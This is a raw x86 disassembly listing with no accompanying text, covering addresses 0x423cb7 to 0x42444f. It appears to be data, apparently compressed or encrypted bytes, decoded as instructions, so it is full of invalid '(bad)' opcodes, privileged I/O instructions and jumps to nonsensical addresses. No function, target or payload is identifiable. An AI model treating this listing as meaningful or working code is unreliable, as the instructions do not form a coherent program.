  423cb7:	stos   BYTE PTR es:[edi],al
  423cb8:	nop
  423cb9:	icebp  
  423cba:	sbb    eax,DWORD PTR [esi-0x48]
  423cbd:	loop   0x423d03
  423cbf:	(bad)  
  423cc1:	(bad)  
  423cc2:	pusha  
  423cc3:	dec    ebx
  423cc4:	push   cs
  423cc5:	jmp    0x423c84
  423cc7:	popf   
  423cc8:	fadd   QWORD PTR [edx]
  423cca:	imul   edx,esp,0xc455a7ba
  423cd0:	push   0x5e
  423cd2:	xchg   ebp,eax
  423cd3:	shr    DWORD PTR [esi+0x3a],cl
  423cd6:	push   ds
  423cd7:	push   ecx
  423cd8:	or     BYTE PTR [edi+0x706e90fb],ch
  423cde:	mov    ch,0xd5
  423ce0:	jl     0x423d44
  423ce2:	repz int3 
  423ce4:	or     edi,DWORD PTR [esi+0x2f877422]
  423cea:	imul   esi,esp,0x7e5f2abd
  423cf0:	es jg  0x423cd9
  423cf3:	aad    0xa6
  423cf5:	dec    ebp
  423cf6:	std    
  423cf7:	pop    edx
  423cf8:	inc    edx
  423cf9:	out    0xa4,eax
  423cfb:	add    al,0x8c
  423cfd:	add    DWORD PTR [eax+0x261f029f],0x9e649814
  423d07:	popf   
  423d08:	jne    0x423cfb
  423d0a:	jge    0x423d45
  423d0c:	ret    0x86a4
  423d0f:	aam    0x46
  423d11:	arpl   WORD PTR [ecx-0x76],sp
  423d14:	and    al,0x30
  423d16:	push   ds
  423d17:	stc    
  423d18:	adc    BYTE PTR es:[eax],bh
  423d1b:	cdq    
  423d1c:	js     0x423d3b
  423d1e:	adc    ah,0x66
  423d21:	push   eax
  423d22:	mov    cl,0x4f
  423d24:	jne    0x423cbd
  423d26:	ficom  DWORD PTR [edi+esi*4-0x17]
  423d2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d2b:	push   ds
  423d2c:	movd   mm4,DWORD PTR [ebp+eax*8+0x2ce3059b]
  423d34:	add    cl,BYTE PTR [bp+si+0x57]
  423d38:	out    dx,al
  423d39:	xor    BYTE PTR [edi+0x69],dh
  423d3c:	push   ecx
  423d3d:	in     eax,0x1f
  423d3f:	shrd   DWORD PTR [edi+0x14],edi,cl
  423d43:	xor    edx,edi
  423d45:	neg    DWORD PTR [edi+edx*8+0x38]
  423d49:	loop   0x423d43
  423d4b:	arpl   WORD PTR [eax-0x22],bx
  423d4e:	aad    0xc
  423d50:	xor    ah,bl
  423d52:	pop    ds
  423d53:	mov    ds:0x6828d698,eax
  423d58:	and    cl,bh
  423d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d5b:	aad    0x4b
  423d5d:	jns    0x423dce
  423d5f:	and    eax,0x8e2d899a
  423d64:	xchg   esi,eax
  423d65:	lds    ebx,FWORD PTR [ebx-0x5e]
  423d68:	popf   
  423d69:	add    ah,bh
  423d6b:	add    dl,BYTE PTR [edi-0x6c]
  423d6e:	out    dx,eax
  423d6f:	mov    al,0xa9
  423d71:	add    eax,0xb95a8c34
  423d76:	mov    ah,cl
  423d78:	xor    al,0x1c
  423d7a:	fs dec ebp
  423d7c:	add    eax,0x7f59c3fe
  423d81:	mov    ds:0x750f97c0,eax
  423d86:	fisubr DWORD PTR [edx]
  423d88:	jne    0x423d2d
  423d8a:	and    ch,dl
  423d8c:	mov    ecx,DWORD PTR [ebx+0x60]
  423d8f:	out    dx,eax
  423d90:	dec    ebx
  423d91:	jmp    0x802c82a6
  423d96:	fbstp  TBYTE PTR [edx*4+0x64d19602]
  423d9d:	jo     0x423df4
  423d9f:	fwait
  423da0:	push   es
  423da1:	jno    0x423dc1
  423da3:	adc    eax,esi
  423da5:	in     al,dx
  423da6:	mov    dl,0x9d
  423da8:	jo     0x423e0e
  423daa:	fcmovbe st,st(5)
  423dac:	int    0xb3
  423dae:	cld    
  423daf:	retf   0x5d05
  423db2:	sbb    ch,ah
  423db4:	cld    
  423db5:	fbld   TBYTE PTR [edi-0x2b]
  423db8:	jb     0x423da1
  423dba:	lock cmp eax,0x8a443cc8
  423dc0:	xor    BYTE PTR [eax-0x47],dh
  423dc3:	aad    0x3d
  423dc5:	push   ds
  423dc6:	loopne 0x423dfe
  423dc8:	sbb    ebx,ebp
  423dca:	pusha  
  423dcb:	popa   
  423dcc:	cdq    
  423dcd:	xchg   esp,eax
  423dce:	ret    0xb646
  423dd1:	ret    
  423dd2:	fcom   st(4)
  423dd4:	xlat   BYTE PTR ds:[ebx]
  423dd5:	xor    eax,0xa8b91d6a
  423dda:	or     al,0xdc
  423ddc:	xor    BYTE PTR [esi+0x1c],dh
  423ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423de0:	arpl   WORD PTR [ebx-0x79],bx
  423de3:	add    eax,0xda2d0d29
  423de8:	(bad)  
  423de9:	sbb    al,0x7a
  423deb:	shr    DWORD PTR [ecx-0x47172ebd],1
  423df1:	jl     0x423db4
  423df3:	cmc    
  423df4:	lods   al,BYTE PTR ds:[esi]
  423df5:	push   ebx
  423df6:	mov    esp,0xfda19698
  423dfb:	lahf   
  423dfc:	or     DWORD PTR [eax],ecx
  423dfe:	mov    bl,0x6d
  423e00:	(bad)  
  423e01:	mov    eax,ds:0x8349d464
  423e06:	xor    DWORD PTR [ebx+0x22],edi
  423e09:	aam    0x5e
  423e0b:	mov    edi,edi
  423e0d:	inc    edi
  423e0e:	add    eax,0x9dea01d7
  423e13:	stos   DWORD PTR es:[edi],eax
  423e14:	add    eax,0x7843c6c1
  423e19:	push   ebp
  423e1a:	pop    ds
  423e1b:	neg    DWORD PTR [eax]
  423e1d:	jge    0x423dae
  423e1f:	addr16 jp 0x423e9d
  423e22:	push   ds
  423e23:	outs   dx,DWORD PTR ds:[esi]
  423e24:	repz adc BYTE PTR [esi+0x6f],0x58
  423e29:	aad    0x98
  423e2b:	mov    DWORD PTR [esi],edx
  423e2d:	cmp    eax,esi
  423e2f:	lods   al,BYTE PTR ds:[esi]
  423e30:	ins    DWORD PTR es:[edi],dx
  423e31:	cmp    edx,ecx
  423e33:	aad    0x95
  423e35:	xchg   ebx,eax
  423e36:	jmp    0x423e0f
  423e38:	mov    BYTE PTR ds:0x946b70fb,al
  423e3e:	into   
  423e3f:	xor    eax,0xe91c1e3d
  423e44:	gs sub eax,ebx
  423e47:	jns    0x423e51
  423e49:	sbb    dh,BYTE PTR [eax]
  423e4b:	ror    DWORD PTR [ecx-0x333b1cb],cl
  423e51:	cmp    al,0x88
  423e53:	jne    0x423e95
  423e55:	add    ah,BYTE PTR [edx-0x3a]
  423e58:	mov    bl,0xe2
  423e5a:	lahf   
  423e5b:	stos   BYTE PTR es:[edi],al
  423e5c:	dec    edx
  423e5d:	push   esi
  423e5e:	pop    ebx
  423e5f:	dec    ebx
  423e60:	cmc    
  423e61:	jb     0x423e1a
  423e63:	clc    
  423e64:	mov    BYTE PTR [ebx-0x4],bh
  423e67:	sbb    BYTE PTR [eax-0x46],bl
  423e6a:	or     ebp,DWORD PTR [ebp-0x677b8d54]
  423e70:	sbb    DWORD PTR [ecx],esp
  423e72:	data16 aam 0x5d
  423e75:	rol    BYTE PTR ds:0xf5d788f1,1
  423e7b:	dec    ebx
  423e7c:	and    WORD PTR [ebx],dx
  423e7f:	fsub   st(4),st
  423e81:	add    dh,BYTE PTR [edx-0x370f384f]
  423e87:	add    eax,0x391f29ed
  423e8c:	ins    BYTE PTR es:[edi],dx
  423e8d:	ss pop edx
  423e8f:	jns    0x423edb
  423e91:	mov    BYTE PTR [eax],0x85
  423e94:	fisub  WORD PTR [ecx+ebp*2-0x5cc842d]
  423e9b:	in     al,0xf9
  423e9d:	or     al,0x31
  423e9f:	sahf   
  423ea0:	mov    BYTE PTR [ecx+0x67f06e4b],ch
  423ea6:	js     0x423ebb
  423ea8:	stos   DWORD PTR es:[edi],eax
  423ea9:	xchg   ebp,eax
  423eaa:	xlat   BYTE PTR ds:[ebx]
  423eab:	aaa    
  423eac:	mov    ah,0xe3
  423eae:	mov    bh,0xd4
  423eb0:	inc    ebx
  423eb1:	inc    esp
  423eb2:	hlt    
  423eb3:	adc    esi,ebx
  423eb5:	call   0x8cc6:0x41b3d960
  423ebc:	jns    0x423f3c
  423ebe:	pop    esi
  423ebf:	add    eax,0x6560f7d1
  423ec4:	xchg   ebp,eax
  423ec5:	mov    ch,0x5d
  423ec7:	rcr    DWORD PTR [esi-0xe31ec47],0x35
  423ece:	mov    ch,BYTE PTR [ecx-0x40]
  423ed1:	imul   esp,DWORD PTR [ecx+0xf],0x5e
  423ed5:	retf   
  423ed6:	mov    cl,0x6a
  423ed8:	inc    ecx
  423ed9:	jecxz  0x423f2b
  423edb:	ret    0x1c0b
  423ede:	mov    eax,0x8c1ff4f3
  423ee3:	popa   
  423ee4:	stc    
  423ee5:	and    BYTE PTR [edx],ch
  423ee7:	rcr    BYTE PTR [eax],1
  423ee9:	(bad)  
  423eea:	int    0xd4
  423eec:	xor    cl,BYTE PTR [esi]
  423eee:	cmovb  esp,DWORD PTR [eax+0xd48fa0]
  423ef5:	jo     0x423e9f
  423ef7:	lahf   
  423ef8:	push   ds
  423ef9:	repz inc esi
  423efb:	mov    dh,BYTE PTR [ebp+edi*8+0x5f09c3b8]
  423f02:	mov    WORD PTR [esi+0x68],?
  423f05:	stos   BYTE PTR es:[edi],al
  423f06:	jno    0x423edd
  423f08:	dec    ebx
  423f09:	pop    es
  423f0a:	jb     0x423ecc
  423f0c:	test   ah,dh
  423f0e:	xor    BYTE PTR [esi-0x78],al
  423f11:	mov    edi,0x13198fe7
  423f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f17:	sub    ah,dh
  423f19:	add    eax,0x165bdd4c
  423f1e:	mov    eax,0x6125b329
  423f23:	and    DWORD PTR [esi],edx
  423f25:	ss xchg ecx,eax
  423f27:	out    dx,al
  423f28:	pushf  
  423f29:	jne    0x423f02
  423f2b:	loop   0x423ec7
  423f2d:	add    ah,BYTE PTR [edx]
  423f2f:	fs int 0xdc
  423f32:	sub    bh,ch
  423f34:	and    ebx,DWORD PTR [edi+ebx*1]
  423f37:	jmp    FWORD PTR [ebx]
  423f39:	jnp    0x423fb8
  423f3b:	and    al,0x77
  423f3d:	mov    WORD PTR [ebx],cs
  423f3f:	icebp  
  423f40:	into   
  423f41:	or     ebp,DWORD PTR [ebp-0x47]
  423f44:	ret    0xd235
  423f47:	sbb    al,0x8
  423f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f4a:	int    0xb4
  423f4c:	dec    ebp
  423f4d:	outs   dx,BYTE PTR ds:[esi]
  423f4e:	(bad)  
  423f4f:	pop    ebp
  423f50:	sbb    al,0x3
  423f52:	aam    0x39
  423f54:	sbb    edx,DWORD PTR [edx+ebx*4+0x3a2558d5]
  423f5b:	mov    dl,0xa
  423f5d:	or     ebx,esp
  423f5f:	sahf   
  423f60:	inc    ebp
  423f61:	xchg   edx,eax
  423f62:	and    BYTE PTR [ebx],ah
  423f64:	or     ah,BYTE PTR [eax+0x3]
  423f67:	cmp    eax,0xbd299b8e
  423f6c:	test   DWORD PTR [edx],esi
  423f6e:	inc    edi
  423f6f:	mov    ch,0x36
  423f71:	jmp    0x91a2eb13
  423f76:	out    dx,eax
  423f77:	(bad)  
  423f78:	repnz mov ds:0x6499c921,al
  423f7e:	pop    ds
  423f7f:	mov    eax,ds:0x38e4673d
  423f84:	or     BYTE PTR [edi-0x24],cl
  423f87:	stos   BYTE PTR es:[edi],al
  423f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f89:	pop    ss
  423f8a:	lock dec edx
  423f8c:	pop    ds
  423f8d:	jl     0x423f18
  423f8f:	jmp    0x423f99
  423f91:	and    edi,DWORD PTR [esi-0x5e6870f1]
  423f97:	daa    
  423f98:	pop    esp
  423f99:	in     eax,dx
  423f9a:	pop    eax
  423f9b:	je     0x423f49
  423f9d:	add    esp,DWORD PTR [ebx+0x6f2cfcd4]
  423fa3:	cmp    BYTE PTR [eax-0x7629dc95],ah
  423fa9:	inc    edi
  423faa:	xchg   ecx,eax
  423fab:	sahf   
  423fac:	or     DWORD PTR ds:0xfebe8d86,ebx
  423fb2:	fst    st(5)
  423fb4:	xchg   ebx,eax
  423fb5:	stos   DWORD PTR es:[edi],eax
  423fb6:	rol    ebx,1
  423fb8:	cmp    DWORD PTR [ebp-0x6a4ad068],0x9489be3c
  423fc2:	push   esp
  423fc3:	pop    ss
  423fc4:	mov    al,ds:0xb6d3b1ac
  423fc9:	pop    ds
  423fca:	icebp  
  423fcb:	sub    al,0x27
  423fcd:	cmp    al,0xf3
  423fcf:	cmp    BYTE PTR [ebx+0x75],cl
  423fd2:	mov    bl,0x76
  423fd4:	push   edi
  423fd5:	rcl    DWORD PTR [esi-0x6c126b60],cl
  423fdb:	xchg   esi,eax
  423fdc:	rol    DWORD PTR [edx-0x1c],cl
  423fdf:	ret    
  423fe0:	sbb    dl,BYTE PTR [ebx+0x5b]
  423fe3:	int3   
  423fe4:	inc    esp
  423fe5:	arpl   WORD PTR [edi+0x6f16e7d5],bp
  423feb:	ss repnz mov ebx,0x5b8e2c36
  423ff2:	iret   
  423ff3:	imul   ebx,DWORD PTR [ebp+0x50a5dee5],0x75
  423ffa:	xchg   ebp,eax
  423ffb:	aam    0xc8
  423ffd:	push   edi
  423ffe:	jbe    0x424023
  424000:	inc    esp
  424001:	inc    esi
  424002:	adc    DWORD PTR [edi],0x1896388
  424008:	cs ins DWORD PTR es:[edi],dx
  42400a:	pop    eax
  42400b:	aaa    
  42400c:	dec    esi
  42400d:	pop    es
  42400e:	(bad)  
  424010:	mov    eax,0x155b505c
  424015:	sub    DWORD PTR [eax],ecx
  424017:	ja     0x424087
  424019:	adc    bl,BYTE PTR [edi]
  42401b:	dec    ebp
  42401c:	inc    eax
  42401d:	js     0x424093
  42401f:	mov    bl,0x2a
  424021:	mov    dh,0x3d
  424023:	xlat   BYTE PTR ds:[ebx]
  424024:	pop    ebx
  424025:	xchg   esi,eax
  424026:	adc    esp,DWORD PTR ds:0xa0c38c42
  42402c:	xchg   ebp,eax
  42402d:	pop    ecx
  42402e:	mov    eax,ds:0x57035540
  424033:	mov    eax,0xd55c6c6e
  424038:	or     al,0x7d
  42403a:	fstp   DWORD PTR [ebp+0x1b]
  42403d:	push   es
  42403e:	cwde   
  42403f:	jno    0x423fe6
  424041:	mov    edi,0x3386cf0b
  424046:	call   0xaba3485f
  42404b:	jle    0x423fce
  42404d:	cmc    
  42404e:	(bad)  
  42404f:	fiadd  WORD PTR [esi+0x3]
  424052:	(bad)  
  424054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424055:	sahf   
  424056:	dec    edi
  424057:	arpl   ax,bx
  424059:	js     0x424079
  42405b:	xchg   edi,eax
  42405c:	xchg   esi,eax
  42405d:	adc    eax,0x1e28329f
  424062:	push   edx
  424063:	aad    0x16
  424065:	adc    esi,esi
  424067:	push   ebx
  424068:	inc    ebp
  424069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42406a:	icebp  
  42406b:	jp     0x424020
  42406d:	jnp    0x424048
  42406f:	cmp    cl,BYTE PTR [eax]
  424071:	outs   dx,BYTE PTR ds:[esi]
  424072:	data16 or BYTE PTR [eax+edi*8],bh
  424076:	cmp    bh,dl
  424078:	jp     0x42401d
  42407a:	fild   QWORD PTR [edx+0x58d04fb1]
  424080:	jg     0x4240e8
  424082:	ins    DWORD PTR es:[edi],dx
  424083:	sub    eax,0xbabe610d
  424088:	mov    dl,dh
  42408a:	sbb    DWORD PTR [edi+0x8c005bb],edi
  424090:	fwait
  424091:	mov    dl,0xfd
  424093:	je     0x424090
  424095:	xchg   ecx,eax
  424096:	sbb    al,0xbe
  424098:	stc    
  424099:	loope  0x4240e5
  42409b:	aad    0x3d
  42409d:	add    BYTE PTR [edx+0x77],0x6c
  4240a1:	enter  0xd57c,0x24
  4240a5:	repnz and eax,0x2df8bd3f
  4240ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240ac:	lock std 
  4240ae:	cmp    al,0xd4
  4240b0:	or     DWORD PTR [eax],edi
  4240b2:	push   ebp
  4240b3:	std    
  4240b4:	mov    ?,WORD PTR [ebp+0x61]
  4240b7:	stos   BYTE PTR es:[edi],al
  4240b8:	sub    BYTE PTR [edi+ecx*2+0x2c35a07],bh
  4240bf:	mov    ah,0xa4
  4240c1:	cwde   
  4240c2:	pop    ebp
  4240c3:	mov    bh,0x72
  4240c5:	dec    ebx
  4240c6:	lahf   
  4240c7:	mov    bl,0xfa
  4240c9:	jl     0x4240ac
  4240cb:	and    DWORD PTR [eax-0x9],ecx
  4240ce:	and    al,0xd4
  4240d0:	pushf  
  4240d1:	repz sbb dl,al
  4240d4:	call   eax
  4240d6:	int3   
  4240d7:	fimul  DWORD PTR [eax-0x5b7542d3]
  4240dd:	aad    0xd5
  4240df:	nop
  4240e0:	adc    al,0x2
  4240e2:	retf   0x1e9b
  4240e5:	out    0x39,eax
  4240e7:	and    eax,0xf12cc50f
  4240ec:	mov    DWORD PTR [ebp+0x10],ebp
  4240ef:	and    al,0xc0
  4240f1:	stos   DWORD PTR es:[edi],eax
  4240f2:	mov    bl,0x83
  4240f4:	das    
  4240f5:	es int3 
  4240f7:	loopne 0x42408b
  4240f9:	xchg   esi,eax
  4240fa:	pop    ds
  4240fb:	jb     0x42408e
  4240fd:	sub    BYTE PTR [esi+edx*1-0x6b],dh
  424101:	xor    eax,DWORD PTR [ebx+0x142300c]
  424107:	out    0x16,eax
  424109:	dec    esi
  42410a:	mov    esp,0xcd04a5d4
  42410f:	or     bl,BYTE PTR [esp+eax*2]
  424112:	lahf   
  424113:	pop    es
  424114:	(bad)  
  424115:	neg    BYTE PTR [edi]
  424117:	inc    ebp
  424118:	inc    ebx
  424119:	pop    ecx
  42411a:	idiv   DWORD PTR [ebx+0x5e]
  42411d:	ins    DWORD PTR es:[edi],dx
  42411e:	jmp    FWORD PTR [edx-0x1f09abc4]
  424124:	ins    DWORD PTR es:[edi],dx
  424125:	push   eax
  424126:	addr16 push edx
  424128:	lods   al,BYTE PTR ds:[esi]
  424129:	add    cl,BYTE PTR [ecx-0x1c]
  42412c:	jnp    0x4241ac
  42412e:	inc    ebp
  42412f:	ja     0x424158
  424131:	jmp    0x98ec:0x4b650d60
  424138:	ror    BYTE PTR [ecx-0x6a772417],1
  42413e:	push   edx
  42413f:	jbe    0x424152
  424141:	pop    esi
  424142:	fisttp WORD PTR [esi]
  424144:	mov    DWORD PTR [ebx-0x54],ecx
  424147:	pop    eax
  424148:	push   esp
  424149:	mov    ds:0x49dd158,al
  42414e:	inc    ebx
  42414f:	test   eax,edx
  424151:	add    dh,dl
  424153:	iret   
  424154:	test   DWORD PTR [edi+0xb12e576],0xc389e716
  42415e:	inc    ecx
  42415f:	xchg   edi,eax
  424160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424161:	xor    DWORD PTR [ecx],esi
  424163:	iret   
  424164:	nop
  424165:	add    ah,dh
  424167:	and    BYTE PTR [ecx],ah
  424169:	pop    ebp
  42416a:	sub    BYTE PTR [eax],dl
  42416c:	push   ds
  42416d:	retf   0xed1f
  424170:	adc    BYTE PTR [edx+0x446474e6],0x30
  424177:	mov    edx,0x80f137e7
  42417c:	or     BYTE PTR [edx-0x7025bc1],dh
  424182:	arpl   WORD PTR ds:0x5cc004be,cx
  424188:	inc    ecx
  424189:	adc    DWORD PTR [eax],0xfffffffe
  42418c:	out    0x5,eax
  42418e:	cld    
  42418f:	(bad)  
  424191:	xchg   edx,eax
  424192:	or     BYTE PTR [ecx],0x8a
  424195:	shl    BYTE PTR [eax-0x2d],cl
  424198:	inc    ebp
  424199:	int    0x77
  42419b:	nop
  42419c:	jle    0x42420b
  42419e:	adc    esp,0x1a
  4241a1:	and    ah,dh
  4241a3:	out    dx,al
  4241a4:	outs   dx,DWORD PTR ds:[esi]
  4241a5:	ins    DWORD PTR es:[edi],dx
  4241a6:	shl    BYTE PTR [ecx],cl
  4241a8:	mov    BYTE PTR [ecx+0x3c],bl
  4241ab:	out    0xca,al
  4241ad:	jmp    0x7720:0xeb80ae0d
  4241b4:	sar    DWORD PTR [esp+eax*4],cl
  4241b7:	sub    esp,DWORD PTR [eax-0x248e3fb]
  4241bd:	add    esi,DWORD PTR [ebx+0x50]
  4241c0:	(bad)  
  4241c1:	sar    DWORD PTR [ecx-0x22ace1c7],cl
  4241c7:	je     0x424239
  4241c9:	(bad)  
  4241ca:	imul   edx,ebp,0xce471335
  4241d0:	dec    DWORD PTR [esi+0x5]
  4241d3:	mov    eax,0xc0d74189
  4241d8:	sbb    dh,bl
  4241da:	xchg   ecx,eax
  4241db:	test   eax,0xae3802ab
  4241e0:	nop
  4241e1:	jns    0x42422e
  4241e3:	(bad)  
  4241e5:	fstp   DWORD PTR [edi]
  4241e7:	bswap  esi
  4241e9:	jl     0x424219
  4241eb:	retf   0x5776
  4241ee:	paddq  mm3,mm4
  4241f1:	inc    ebp
  4241f2:	pop    DWORD PTR [ebx]
  4241f4:	and    BYTE PTR [esi],bl
  4241f6:	cli    
  4241f7:	mov    edi,0xa414f35b
  4241fc:	mov    DWORD PTR ds:0xc9ceb5f3,eax
  424202:	inc    edi
  424203:	mov    dh,0xe6
  424205:	daa    
  424206:	sbb    cl,BYTE PTR [esi-0x61]
  424209:	xchg   ebx,eax
  42420a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42420b:	mov    BYTE PTR [edx-0x21],cl
  42420e:	ret    0xf820
  424211:	and    edx,0x16ba5c0c
  424217:	inc    ebx
  424218:	mov    edi,edi
  42421a:	pop    es
  42421b:	add    eax,DWORD PTR [ebx-0x6c2a6cde]
  424221:	add    eax,0x6be664c0
  424226:	jmp    0x2159:0x6b45c790
  42422d:	adc    al,0x87
  42422f:	nop
  424230:	popf   
  424231:	add    eax,0x7dac3282
  424236:	mov    al,ss:0x771f12df
  42423c:	out    0xc5,eax
  42423e:	bound  eax,QWORD PTR ds:[ecx-0x67]
  424242:	scas   al,BYTE PTR es:[edi]
  424243:	int    0xe0
  424245:	add    BYTE PTR [esi+0x7fc5c9b1],cl
  42424b:	into   
  42424c:	psrlq  mm1,QWORD PTR [edx-0x58]
  424250:	jo     0x424210
  424252:	push   es
  424253:	xor    eax,0xdd323d39
  424258:	mov    BYTE PTR [edi],cl
  42425a:	loop   0x4242d9
  42425c:	in     eax,dx
  42425d:	inc    edx
  42425e:	fldcw  WORD PTR [edx]
  424260:	push   0xeb4803
  424265:	pushf  
  424266:	sbb    BYTE PTR [ebx-0x28],bl
  424269:	mov    dh,0x65
  42426b:	and    DWORD PTR [edi+0x434d5be3],ebx
  424271:	and    dh,BYTE PTR ds:0x9e036358
  424277:	push   esi
  424278:	fdivrp st(2),st
  42427a:	or     ch,BYTE PTR es:[ebx+0x408b60cf]
  424281:	(bad)  
  424282:	pop    ecx
  424283:	adc    BYTE PTR [eax-0x71],dh
  424286:	sub    eax,edx
  424288:	jge    0x4242eb
  42428a:	adc    eax,DWORD PTR [esi-0x121f46e6]
  424290:	int    0x95
  424292:	mov    al,BYTE PTR [esi+eax*8]
  424295:	dec    eax
  424296:	in     al,0x84
  424298:	add    DWORD PTR ds:0xb7744bb2,0xa5f4a16b
  4242a2:	inc    ecx
  4242a3:	aam    0xf7
  4242a5:	mov    bh,0x53
  4242a7:	fcomip st,st(0)
  4242a9:	push   ds
  4242aa:	popf   
  4242ab:	aam    0x3
  4242ad:	outs   dx,BYTE PTR ds:[esi]
  4242ae:	ss enter 0xbae8,0x2c
  4242b3:	mov    cl,0xb3
  4242b5:	out    dx,eax
  4242b6:	mov    cs,WORD PTR [edx-0x5085cdf5]
  4242bc:	retf   0xdfec
  4242bf:	imul   eax,eax,0x42d471f3
  4242c5:	mov    ds:0xf139f33b,al
  4242ca:	lods   al,BYTE PTR ds:[esi]
  4242cb:	repz mov ch,0x87
  4242ce:	test   BYTE PTR [eax],dl
  4242d0:	mov    DWORD PTR [edx+0x27],ebp
  4242d3:	je     0x42432f
  4242d5:	fstp   TBYTE PTR [esi]
  4242d7:	stos   BYTE PTR es:[edi],al
  4242d8:	aaa    
  4242d9:	retf   
  4242da:	rcr    DWORD PTR [ebp-0x7d],0xc3
  4242de:	shr    DWORD PTR [esi+0x3e],0xdb
  4242e2:	add    bl,bh
  4242e4:	mov    DWORD PTR [ecx+0x23],ecx
  4242e7:	nop
  4242e8:	repz std 
  4242ea:	(bad)  
  4242ec:	and    BYTE PTR [ebx],al
  4242ee:	pop    esi
  4242ef:	(bad)  
  4242f0:	fdiv   QWORD PTR [ebx+eax*4+0x7b0aacee]
  4242f7:	xor    eax,0x95a3aa2e
  4242fc:	pop    esp
  4242fd:	cdq    
  4242fe:	les    edi,FWORD PTR cs:[ebx]
  424301:	add    ah,BYTE PTR [eax]
  424303:	dec    ecx
  424304:	shr    DWORD PTR [eax],1
  424306:	dec    ebp
  424307:	add    BYTE PTR [ecx],al
  424309:	popa   
  42430a:	iret   
  42430b:	jae    0x424343
  42430d:	add    ch,BYTE PTR [edx+0x35]
  424310:	inc    eax
  424311:	psubusb mm1,QWORD PTR [ebx+0x70]
  424315:	add    dl,al
  424317:	mov    ebx,0xd935f9a6
  42431c:	push   0x6c
  42431e:	pop    ds
  42431f:	sti    
  424320:	test   BYTE PTR [edi+eax*2-0xf],bl
  424324:	push   ds
  424325:	push   cs
  424326:	cmp    al,0xd7
  424328:	push   ecx
  424329:	(bad)  
  42432a:	cwde   
  42432b:	retf   0x860e
  42432e:	in     eax,0x6a
  424330:	mov    DWORD PTR [edi+0x1],esi
  424333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424334:	mov    esi,0xb19bc78f
  424339:	sub    edx,esp
  42433b:	mov    al,ds:0xd399318b
  424340:	das    
  424341:	push   0x59
  424343:	sub    eax,0x20cf270e
  424348:	or     al,0x4
  42434a:	pusha  
  42434b:	mov    edi,0x4aa190e0
  424350:	inc    eax
  424351:	add    eax,0x1e15fdb7
  424356:	mov    esi,0x1f71cccf
  42435b:	arpl   WORD PTR cs:[edx],ax
  42435e:	test   eax,0x40e05112
  424363:	inc    eax
  424364:	ret    0x1439
  424367:	xlat   BYTE PTR ds:[ebx]
  424368:	mul    DWORD PTR [eax+0x794d0a7b]
  42436e:	(bad)  
  42436f:	imul   ecx,DWORD PTR [ecx+0x6ae6d3db],0xfffffff6
  424376:	jns    0x424328
  424378:	push   ebx
  424379:	add    eax,DWORD PTR [edx]
  42437b:	sub    BYTE PTR ds:0x45895496,dh
  424381:	xchg   esp,eax
  424382:	ins    BYTE PTR es:[edi],dx
  424383:	lahf   
  424384:	xchg   esi,eax
  424385:	and    eax,0xfdac369f
  42438a:	repnz (bad) 
  42438c:	or     eax,DWORD PTR [esi-0x34]
  42438f:	ret    
  424390:	(bad)  [edx]
  424392:	rcl    ebp,0xc9
  424395:	fistp  WORD PTR [edx+0x12bb22c5]
  42439b:	aam    0xf6
  42439d:	xchg   ebp,eax
  42439e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42439f:	cmp    al,0x85
  4243a1:	popa   
  4243a2:	out    0xad,al
  4243a4:	pusha  
  4243a5:	fbld   TBYTE PTR [eax+0x57]
  4243a8:	or     DWORD PTR [ecx+0x46],esi
  4243ab:	push   esi
  4243ac:	xor    DWORD PTR [ebx],ebx
  4243ae:	hlt    
  4243af:	pop    esp
  4243b0:	enter  0x60ad,0x2a
  4243b4:	mov    dh,0x68
  4243b6:	xadd   BYTE PTR [esi],ah
  4243b9:	loopne 0x42441c
  4243bb:	pop    ds
  4243bc:	dec    edi
  4243bd:	loopne 0x424381
  4243bf:	pop    esp
  4243c0:	jecxz  0x42442d
  4243c2:	(bad)  
  4243c3:	push   esi
  4243c4:	call   0x5c1e:0xd0f083a2
  4243cb:	loope  0x424399
  4243cd:	mov    edi,0xb548110a
  4243d2:	mov    edx,0x7bb8e9bd
  4243d7:	xchg   edi,eax
  4243d8:	mov    dl,0x58
  4243da:	push   0xffffff95
  4243dc:	ins    DWORD PTR es:[edi],dx
  4243dd:	(bad)  
  4243de:	cs inc edi
  4243e0:	adc    eax,0xec08b014
  4243e5:	iret   
  4243e6:	mov    eax,0x3fe809f5
  4243eb:	ss test bl,0x5a
  4243ef:	shl    BYTE PTR [ebx],1
  4243f1:	call   0x3b97136
  4243f6:	pop    ds
  4243f7:	sub    BYTE PTR [ebx+ecx*1],cl
  4243fa:	loope  0x4243d0
  4243fc:	jb     0x4243c1
  4243fe:	fdiv   QWORD PTR [ecx+0x31]
  424401:	into   
  424402:	iret   
  424403:	clc    
  424404:	xchg   DWORD PTR [edi],edx
  424406:	push   edx
  424407:	mov    dh,0xb5
  424409:	push   eax
  42440a:	pop    edi
  42440b:	mov    dl,0x42
  42440d:	sub    BYTE PTR [ecx-0x2b],dh
  424410:	mov    ds:0x2c7cfb85,al
  424415:	out    dx,al
  424416:	xor    al,BYTE PTR [edi-0x49]
  424419:	call   FWORD PTR [ebx-0x23bce1b2]
  42441f:	mov    edx,0xa63c45ad
  424424:	lock daa 
  424426:	retf   
  424427:	(bad)  
  424428:	clc    
  424429:	jge    0x4243ef
  42442b:	add    DWORD PTR [edi+eax*2-0x43],0x8e401de4
  424433:	retf   0xf58e
  424436:	retf   0x4073
  424439:	stos   DWORD PTR es:[edi],eax
  42443a:	inc    edi
  42443b:	shl    dl,0x85
  42443e:	mov    edx,0xaf232cac
  424443:	aam    0xae
  424445:	popf   
  424446:	push   es
  424447:	repz push edx
  424449:	adc    cl,BYTE PTR [ebp-0x6]
  42444c:	lea    ebx,[ecx-0x60]
  42444f:	mov    ah,0xa1
